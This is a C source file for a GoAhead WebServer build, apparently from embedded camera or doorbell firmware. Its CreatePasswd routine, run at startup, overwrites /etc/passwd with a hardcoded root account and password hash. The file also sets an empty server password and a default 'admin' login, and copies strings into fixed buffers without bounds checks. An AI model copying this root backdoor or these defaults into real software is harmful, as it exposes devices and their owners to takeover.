/*
 * main.c -- Main program for the GoAhead WebServer (LINUX version)
 *
 * Copyright (c) GoAhead Software Inc., 1995-2000. All Rights Reserved.
 *
 * See the file "license.txt" for usage and redistribution license requirements
 *
 * $Id: main.c,v 1.5 2003/09/11 14:03:46 bporter Exp $
 */

/******************************** Description *********************************/

/*
 *	Main program for for the GoAhead WebServer. This is a demonstration
 *	main program to initialize and configure the web server.
 */

/********************************* Includes ***********************************/
#include	"uemf.h"
#include	"wsIntrn.h"
#include	<signal.h>
#include	<unistd.h>
#include	<sys/types.h>
#include	<sys/wait.h>
#include "param.h"
#include "debug.h"

#ifdef WEBS_SSL_SUPPORT
#include	"websSSL.h"
#endif

#ifdef USER_MANAGEMENT_SUPPORT
#include	"um.h"
void	formDefineUserMgmt( void );
#endif


/*********************************** Locals ***********************************/
/*
 *	Change configuration here
 */

static char_t*		rootWeb = T( "/system/www" );	/* Root web directory */
static char_t*		password = T( "" );		/* Security password */
static int		port = 81;//bparam.stNetParam.nPort;	/* Server port */
static int		retries = 5;			/* Server port retries */
static int		finished;			/* Finished flag */

/****************************** Forward Declarations **************************/

static int 	initWebs();
static int	aspTest( int eid, webs_t wp, int argc, char_t** argv );
static void 	formTest( webs_t wp, char_t* path, char_t* query );
static int  	websHomePageHandler( webs_t wp, char_t* urlPrefix, char_t* webDir,
                                     int arg, char_t* url, char_t* path, char_t* query );
extern void 	defaultErrorHandler( int etype, char_t* msg );
extern void 	defaultTraceHandler( int level, char_t* buf );
#ifdef B_STATS
static void 	printMemStats( int handle, char_t* fmt, ... );
static void 	memLeaks();
#endif

void CreatePasswd( void )
{
    FILE* fp = NULL;
    char  temp[128];
    fp = fopen( "/etc/passwd", "wb" );

    if ( fp == NULL )
    {
        return;
    }

    memset( temp, 0x00, 128 );
    strcpy( temp, "root:LSiuY7pOmZG2s:0:0:Adminstrator:/:/bin/sh" );
    fwrite( temp, 1, strlen( temp ), fp );
    fclose( fp );
    //root:x:0:admin
    fp = fopen( "/etc/group", "wb" );

    if ( fp == NULL )
    {
        return;
    }

    memset( temp, 0x00, 128 );
    strcpy( temp, "root:x:0:admin" );
    fwrite( temp, 1, strlen( temp ), fp );
    fclose( fp );
}

void webdebug( char* pbuf, int cmd )
{
// 	printf("web:%s\n",pbuf);
#if 1
    FILE* fp = NULL;

    if ( cmd == 0x00 )
    {
        fp = fopen( "/tmp/web1.txt", "ab+" );

        if ( fp == NULL )
        {
            printf( "live dbg file open failed\n" );
            return;
        }
    }

    else
    {
        fp = fopen( "/tmp/web1.txt", "wb" );

        if ( fp == NULL )
        {
            printf( "live dbg file open failed\n" );
            return;
        }
    }

    fwrite( pbuf, 1, strlen( pbuf ), fp );
    fclose( fp );
#endif
}

/*********************************** Code *************************************/
/*
 *	Main -- entry point from LINUX
 */
#if 0
int main( int argc, char** argv )
{
#else
int web_main( void )
{
#endif
    unsigned char temp[128];
    unsigned int webref = 0;
    /*
     *	Initialize the memory allocator. Allow use of malloc and start
     *	with a 60K heap.  For each page request approx 8KB is allocated.
     *	60KB allows for several concurrent page requests.  If more space
     *	is required, malloc will be used for the overflow.
     */
    bopen( NULL, ( 60 * 1024 ), B_USE_MALLOC );
    //signal(SIGCHLD, SIG_DFL);
    signal( SIGPIPE, SIG_IGN );
    /*
     *	Initialize the web server
     */
    initWebs();
#ifdef WEBS_SSL_SUPPORT
    websSSLOpen();
#endif

    /*
     *	Basic event loop. SocketReady returns true when a socket is ready for
     *	service. SocketSelect will block until an event occurs. SocketProcess
     *	will actually do the servicing.
     */
    while ( !finished )
    {
        memset( temp, 0x00, 128 );
        sprintf( temp, "web cnt %d\n", webref++ );
        webdebug( temp, 1 );
        //printf("web0\n");
        webdebug( "web0\n", 0 );

        if ( socketReady( -1 ) || socketSelect( -1, 1000 ) )
        {
            //printf("web1\n");
            webdebug( "web1\n", 0 );
            socketProcess( -1 );
            webdebug( "web2\n", 0 );
            //printf("web2\n");
        }

        //printf("web3\n");
        webdebug( "web3\n", 0 );
        websCgiCleanup();
        webdebug( "web4\n", 0 );
        //printf("web4\n");
        webdebug( "web5\n", 0 );
        emfSchedProcess();
        webdebug( "web6\n", 0 );
        //printf("web5\n");
    }

    //webdebug("socketprocess exit...\n",0);
#ifdef WEBS_SSL_SUPPORT
    websSSLClose();
#endif
#ifdef USER_MANAGEMENT_SUPPORT
    umClose();
#endif
    /*
     *	Close the socket module, report memory leaks and close the memory allocator
     */
    websCloseServer();
    socketClose();
#ifdef B_STATS
    memLeaks();
#endif
    bclose();
    return 0;
}

/******************************************************************************/
/*
 *	Initialize the web server.
 */

static int initWebs()
{
    struct hostent*	hp;
    struct in_addr	intaddr;
    char			host[128], dir[128], webdir[128];
    char*			cp;
    char_t			wbuf[128];
    char			admu[32];
    char			admp[32];
    char			ipaddr[16];
    /*
     *	Initialize the socket subsystem
     */
    socketOpen();
#ifdef USER_MANAGEMENT_SUPPORT
    /*
     *	Initialize the User Management database
     */
#if 0
    umOpen();
    umRestore( T( "umconfig.txt" ) );
#else
#if 0
    memset( admu, 0x00, 32 );
    memset( admp, 0x00, 32 );
    sprintf( admu, "admin" );
    sprintf( admp, "admin" );
#endif
    umOpen();
    //umRestore(T("umconfig.txt"));
    //winfred: instead of using umconfig.txt, we create 'the one' adm defined in nvram
    umAddGroup( T( "adm" ), 0x07, AM_DIGEST, FALSE, FALSE );

/* BEGIN: Modified by wupm(2073111@qq.com), 2014/6/16 */
#if	0
    memset( admu, 0x00, 32 );
    memset( admp, 0x00, 32 );
    sprintf( admu, "%s", bparam.stUserParam[0].szUserName );
    sprintf( admp, "%s", bparam.stUserParam[0].szPassword );
    umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );

    memset( admu, 0x00, 32 );
    memset( admp, 0x00, 32 );
    sprintf( admu, "%s", bparam.stUserParam[1].szUserName );
    sprintf( admp, "%s", bparam.stUserParam[1].szPassword );
    umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );

    memset( admu, 0x00, 32 );
    memset( admp, 0x00, 32 );
    sprintf( admu, "%s", bparam.stUserParam[2].szUserName );
    sprintf( admp, "%s", bparam.stUserParam[2].szPassword );
    umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );
#else
	/*if ( 1 )
	{
		int i;
		for ( i=0; i<MAX_USER; i++ )
		{
			if ( bparam.stBell.user[i][0] != 0 )
			{
				memset( admu, 0x00, 32 );
			    memset( admp, 0x00, 32 );
			    sprintf( admu, "%s", bparam.stBell.user[i] );
			    sprintf( admp, "%s", bparam.stBell.pwd[i] );
			    umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );
			}
		}
	}*/

    memset( admu, 0x00, 32 );
    memset( admp, 0x00, 32 );
    if(bparam.stBell.user[0][0] != 0)
        sprintf( admu, "%s", bparam.stBell.user[0] );
    else
        strcpy(admu, "admin");
    if(bparam.stBell.pwd[0][0] != 0)
        sprintf( admp, "%s", bparam.stBell.pwd[0] );
    umAddUser( admu, admp, T( "adm" ), FALSE, FALSE );
	
#endif

#if 0
    umAddUser( "admin0", "admin0", T( "adm" ), FALSE, FALSE );
    umAddUser( "admin1", "admin1", T( "adm" ), FALSE, FALSE );
#endif
    umAddAccessLimit( T( "/" ), AM_DIGEST, FALSE, T( "adm" ) );
#endif
#endif
    /*
     *	Define the local Ip address, host name, default home page and the
     *	root web directory.
     */
#if 0

    if ( gethostname( host, sizeof( host ) ) < 0 )
    {
        error( E_L, E_LOG, T( "Can't get hostname" ) );
        return -1;
    }

    if ( ( hp = gethostbyname( host ) ) == NULL )
    {
        error( E_L, E_LOG, T( "Can't get host address" ) );
        return -1;
    }

    memcpy( ( char* ) &intaddr, ( char* ) hp->h_addr_list[0],
            ( size_t ) hp->h_length );
#else
    memset( ipaddr, 0x00, 16 );
    sprintf( ipaddr, "%s", bparam.stNetParam.szIpAddr );
    intaddr.s_addr = inet_addr( ipaddr );
#endif
    /*
     *	Set ../web as the root web. Modify this to suit your needs
     */
    getcwd( dir, sizeof( dir ) );

    if ( ( cp = strrchr( dir, '/' ) ) )
    {
        *cp = '\0';
    }

    sprintf( webdir, "%s/%s", dir, rootWeb );
    /*
     *	Configure the web server options before opening the web server
     */
    memset( wbuf, 0x00, 128 );
    memset( host, 0x00, 128 );
    websSetDefaultDir( webdir );
    cp = inet_ntoa( intaddr );
    ascToUni( wbuf, cp, min( strlen( cp ) + 1, sizeof( wbuf ) ) );
    websSetIpaddr( wbuf );
    ascToUni( wbuf, host, min( strlen( host ) + 1, sizeof( wbuf ) ) );
    websSetHost( wbuf );
    /*
     *	Configure the web server options before opening the web server
     */
    websSetDefaultPage( T( "index.htm" ) );
    websSetPassword( password );
    /*
     *	Open the web server on the given port. If that port is taken, try
     *	the next sequential port for up to "retries" attempts.
     */
    port = bparam.stNetParam.nPort;
    websOpenServer( port, retries );
    /*
     * 	First create the URL handlers. Note: handlers are called in sorted order
     *	with the longest path handler examined first. Here we define the security
     *	handler, forms handler and the default web page handler.
     */
    websUrlHandlerDefine( T( "" ), NULL, 0, websSecurityHandler, WEBS_HANDLER_FIRST );
    websUrlHandlerDefine( T( "/goform" ), NULL, 0, websFormHandler, 0 );
    websUrlHandlerDefine( T( "/cgi-bin" ), NULL, 0, websCgiHandler, 0 );
    websUrlHandlerDefine( T( "" ), NULL, 0, websDefaultHandler,
                          WEBS_HANDLER_LAST );
    /*
     *	Now define two test procedures. Replace these with your application
     *	relevant ASP script procedures and form functions.
     */
    websAspDefine( T( "aspTest" ), aspTest );
    websFormDefine( T( "formTest" ), formTest );
    /*
     *	Create the Form handlers for the User Management pages
     */
#ifdef USER_MANAGEMENT_SUPPORT
    formDefineUserMgmt();
#endif
    /*
     *	Create a handler for the default home page
     */
    websUrlHandlerDefine( T( "/" ), NULL, 0, websHomePageHandler, 0 );
    return 0;
}

/******************************************************************************/
/*
 *	Test Javascript binding for ASP. This will be invoked when "aspTest" is
 *	embedded in an ASP page. See web/asp.asp for usage. Set browser to
 *	"localhost/asp.asp" to test.
 */

static int aspTest( int eid, webs_t wp, int argc, char_t** argv )
{
    char_t*	name, *address;

    if ( ejArgs( argc, argv, T( "%s %s" ), &name, &address ) < 2 )
    {
        websError( wp, 400, T( "Insufficient args\n" ) );
        return -1;
    }

    return websWrite( wp, T( "Name: %s, Address %s" ), name, address );
}

/******************************************************************************/
/*
 *	Test form for posted data (in-memory CGI). This will be called when the
 *	form in web/forms.asp is invoked. Set browser to "localhost/forms.asp" to test.
 */

static void formTest( webs_t wp, char_t* path, char_t* query )
{
    char_t*	name, *address;
    name = websGetVar( wp, T( "name" ), T( "Joe Smith" ) );
    address = websGetVar( wp, T( "address" ), T( "1212 Milky Way Ave." ) );
    websHeader( wp );
    websWrite( wp, T( "<body><h2>Name: %s, Address: %s</h2>\n" ), name, address );
    websFooter( wp );
    websDone( wp, 200 );
}

/******************************************************************************/
/*
 *	Home page handler
 */

static int websHomePageHandler( webs_t wp, char_t* urlPrefix, char_t* webDir,
                                int arg, char_t* url, char_t* path, char_t* query )
{
    /*
     *	If the empty or "/" URL is invoked, redirect default URLs to the home page
     */
    if ( *url == '\0' || gstrcmp( url, T( "/" ) ) == 0 )
    {
        websRedirect( wp, T( "index.htm" ) );
        return 1;
    }

    return 0;
}

/******************************************************************************/
/*
 *	Default error handler.  The developer should insert code to handle
 *	error messages in the desired manner.
 */

void defaultErrorHandler( int etype, char_t* msg )
{
#if 0
    write( 1, msg, gstrlen( msg ) );
#endif
}

/******************************************************************************/
/*
 *	Trace log. Customize this function to log trace output
 */

void defaultTraceHandler( int level, char_t* buf )
{
    /*
     *	The following code would write all trace regardless of level
     *	to stdout.
     */
#if 0
    if ( buf )
    {
        write( 1, buf, gstrlen( buf ) );
    }

#endif
}

/******************************************************************************/
/*
 *	Returns a pointer to an allocated qualified unique temporary file name.
 *	This filename must eventually be deleted with bfree();
 */

char_t* websGetCgiCommName()
{
    char_t*	pname1, *pname2;
    printf( "cgi\n" );
    pname1 = tempnam( NULL, T( "cgi" ) );
    pname2 = bstrdup( B_L, pname1 );
    free( pname1 );
    return pname2;
}

/******************************************************************************/
/*
 *	Launch the CGI process and return a handle to it.
 */

int websLaunchCgiProc( char_t* cgiPath, char_t** argp, char_t** envp,
                       char_t* stdIn, char_t* stdOut )
{
    int	pid, fdin, fdout, hstdin, hstdout, rc;
    fdin = fdout = hstdin = hstdout = rc = -1;

    if ( ( fdin = open( stdIn, O_RDWR | O_CREAT, 0666 ) ) < 0 ||
         ( fdout = open( stdOut, O_RDWR | O_CREAT, 0666 ) ) < 0 ||
         ( hstdin = dup( 0 ) ) == -1 ||
         ( hstdout = dup( 1 ) ) == -1 ||
         dup2( fdin, 0 ) == -1 ||
         dup2( fdout, 1 ) == -1 )
    {
        goto DONE;
    }

    rc = pid = fork();

    if ( pid == 0 )
    {
        /*
         *		if pid == 0, then we are in the child process
         */
        if ( execve( cgiPath, argp, envp ) == -1 )
        {
            printf( "content-type: text/html\n\n"
                    "Execution of cgi process failed\n" );
        }

        exit( 0 );
    }

DONE:

    if ( hstdout >= 0 )
    {
        dup2( hstdout, 1 );
        close( hstdout );
    }

    if ( hstdin >= 0 )
    {
        dup2( hstdin, 0 );
        close( hstdin );
    }

    if ( fdout >= 0 )
    {
        close( fdout );
    }

    if ( fdin >= 0 )
    {
        close( fdin );
    }

    return rc;
}

/******************************************************************************/
/*
 *	Check the CGI process.  Return 0 if it does not exist; non 0 if it does.
 */

int websCheckCgiProc( int handle )
{
    /*
     *	Check to see if the CGI child process has terminated or not yet.
     */
    if ( waitpid( handle, NULL, WNOHANG ) == handle )
    {
        return 0;
    }

    else
    {
        return 1;
    }
}

/******************************************************************************/

#ifdef B_STATS
static void memLeaks()
{
    int		fd;

    if ( ( fd = gopen( T( "leak.txt" ), O_CREAT | O_TRUNC | O_WRONLY, 0666 ) ) >= 0 )
    {
        bstats( fd, printMemStats );
        close( fd );
    }
}

/******************************************************************************/
/*
 *	Print memory usage / leaks
 */

static void printMemStats( int handle, char_t* fmt, ... )
{
    va_list		args;
    char_t		buf[256];
    va_start( args, fmt );
    vsprintf( buf, fmt, args );
    va_end( args );
    write( handle, buf, strlen( buf ) );
}
#endif

/******************************************************************************/
void WebInit( void )
{
}

void* WebThreadProc( void* p )
{
    printf( "web pid:%d\n", getpid() );
    CreatePasswd();
    web_main();

	/* BEGIN: Added by wupm, 2013/7/1 */
	return NULL;
}

void WebThread( void )
{
    pthread_t ntpthread;
    pthread_create( &ntpthread, 0, &WebThreadProc, NULL );
    //WebServer();
}
